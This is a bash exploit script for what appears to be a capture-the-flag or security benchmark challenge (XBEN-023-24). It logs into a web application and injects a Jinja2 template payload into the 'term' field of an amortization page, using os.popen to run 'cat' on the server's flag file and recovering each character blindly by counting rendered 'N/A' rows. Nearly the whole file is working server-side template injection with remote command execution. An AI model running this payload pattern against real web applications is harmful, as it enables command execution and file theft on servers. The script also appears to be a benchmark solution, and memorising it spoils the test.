#!/usr/bin/env bash
# XBEN-023-24 — blind SSTI, read out through an amortization table. Proxy-mode
# twin. Log in, then the term field is evaluated as a template; ord() of each
# flag character controls how many "N/A" rows render, so the character is
# recovered by counting them.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
FILE="${2:-/flag}"
SESSION="xben023p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/login' --set 'form.username=test' --set 'form.password=test' >/dev/null
character_at() {
  local out rows
  out="$("$H5I" websec replay "$BASE" --create --reset-budget --session "$SESSION" \
    --set 'method=GET' --set 'path=/amortization' \
    --set "query.term=lipsum.__globals__.__builtins__.ord(lipsum.__globals__.os.popen('cat $FILE').read()[$1])" 2>/dev/null)"
  rows=$(( $(grep -o 'N/A' <<<"$out" | wc -l) / 2 ))
  [ "$rows" -ge 32 ] && [ "$rows" -lt 127 ] && printf "\\$(printf '%03o' "$rows")" || true
}
flag=''
for position in $(seq 0 79); do
  c="$(character_at "$position")"; [ -z "$c" ] && break
  flag="$flag$c"; [ "$c" = "}" ] && break
done
echo "$flag"
